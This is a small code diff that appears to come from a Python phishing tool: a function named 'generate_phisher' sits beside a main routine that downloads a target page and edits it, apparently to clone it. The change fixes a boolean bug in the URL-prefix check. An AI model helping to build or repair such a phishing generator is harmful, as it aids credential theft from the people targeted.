@@ -109,7 +109,7 @@ def generate_phisher(to_log, url):
 
 def main(args):
     url = args.url
-    if not url.startswith('http://') or not url.startswith('https://'):
+    if not url.startswith('http://') and not url.startswith('https://'):
         url = 'http://' + url
     download_page(url, 'page.html')
     to_log = edit_page('page.html')
